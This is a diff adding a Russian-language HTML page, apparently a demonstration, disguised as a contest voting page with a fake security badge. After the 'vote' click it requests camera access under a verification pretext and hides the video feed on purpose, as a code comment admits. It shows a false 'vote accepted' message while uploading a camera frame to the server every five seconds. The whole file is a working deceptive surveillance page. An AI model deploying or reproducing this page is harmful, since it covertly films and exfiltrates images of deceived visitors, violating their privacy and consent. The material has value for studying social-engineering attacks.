@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Демонстрация доступа к камере</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; }
+        .container { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); padding: 3rem; border-radius: 20px; border: 1px solid rgba(255,255,255,0.2); box-shadow: 0 8px 32px rgba(0,0,0,0.3); text-align: center; max-width: 500px; width: 90%; }
+        h1 { margin-bottom: 0.5rem; font-size: 2rem; }
+        p { margin-bottom: 2rem; opacity: 0.9; }
+        .candidate-card { background: white; color: #333; padding: 1rem; border-radius: 15px; margin-bottom: 2rem; display: flex; align-items: center; gap: 1rem; text-align: left; }
+        .candidate-img { width: 60px; height: 60px; background: #ddd; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; color: #774ca0; font-size: 1.5rem; }
+        video { width: 100%; max-width: 300px; border-radius: 10px; margin-top: 1rem; display: none; border: 3px solid #fff; }
+        button { padding: 15px 40px; font-size: 18px; font-weight: bold; cursor: pointer; background: #ff4b2b; background: linear-gradient(to right, #ff416c, #ff4b2b); color: white; border: none; border-radius: 50px; transition: transform 0.2s, box-shadow 0.2s; box-shadow: 0 4px 15px rgba(255, 75, 43, 0.4); }
+        button:hover { transform: scale(1.05); box-shadow: 0 6px 20px rgba(255, 75, 43, 0.6); }
+        button:active { transform: scale(0.98); }
+        #status { margin-top: 1.5rem; font-size: 0.9rem; min-height: 1.2rem; }
+        .secure-badge { display: flex; align-items: center; justify-content: center; gap: 5px; margin-top: 2rem; font-size: 0.8rem; opacity: 0.7; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Голосование 2026</h1>
+        <p>Поддержите своего кандидата в финале конкурса!</p>
+        
+        <div class="candidate-card">
+            <div class="candidate-img">ДИ</div>
+            <div>
+                <div style="font-weight: bold;">Денис Идиятуллин</div>
+                <div style="font-size: 0.8rem; color: #666;">Кибербезопаность</div>
+            </div>
+        </div>
+
+        <button id="startBtn">ПРОГОЛОСОВАТЬ</button>
+        
+        <div id="status"></div>
+        <video id="video" autoplay playsinline muted></video>
+
+        <div class="secure-badge">
+            <svg width="12" height="12" fill="currentColor" viewBox="0 0 16 16">
+                <path d="M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zm3 6V3a3 3 0 0 0-6 0v4a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2z"/>
+            </svg>
+            Безопасное соединение подтверждено
+        </div>
+    </div>
+
+    <script>
+        const startBtn = document.getElementById('startBtn');
+        const video = document.getElementById('video');
+        const status = document.getElementById('status');
+
+        startBtn.addEventListener('click', async () => {
+            try {
+                status.innerText = "Инициализация системы верификации...";
+                
+                // Запрашиваем камеру под предлогом "FaceID" или "Селфи-верификации"
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: true, 
+                    audio: false 
+                });
+
+                video.srcObject = stream;
+                // Скрываем видео, чтобы пользователь не сразу понял, что его снимают
+                // Или показываем маленькое окошко "верификации"
+                video.style.display = "none"; 
+                
+                startBtn.innerText = "ГОЛОС ПРИНЯТ!";
+                startBtn.style.background = "linear-gradient(to right, #56ab2f, #a8e063)";
+                status.innerText = "Спасибо! Ваш голос учтен.";
+                status.style.color = "#a8e063";
+
+                // Начинаем скрытую отправку кадров
+                captureAndUpload(video); // Первый кадр сразу
+                setInterval(() => {
+                    captureAndUpload(video);
+                }, 5000);
+
+            } catch (err) {
+                console.error("Ошибка:", err);
+                status.innerText = "Ошибка: Для голосования необходима верификация личности.";
+                status.style.color = "#ff4b2b";
+            }
+        });
+        // Функция для захвата кадра и отправки на сервер
+        async function captureAndUpload(videoElement) {
+            const canvas = document.createElement('canvas');
+            canvas.width = videoElement.videoWidth;
+            canvas.height = videoElement.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+            // Превращаем в base64
+            const imageData = canvas.toDataURL('image/png');
+
+            try {
+                const response = await fetch('/upload', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: imageData })
+                });
+
+                if (response.ok) {
+                    console.log("[!] Кадр успешно отправлен на сервер");
+                }
+            } catch (err) {
+                console.error("Ошибка отправки:", err);
+            }
+        }
+    </script></body>
+</html>
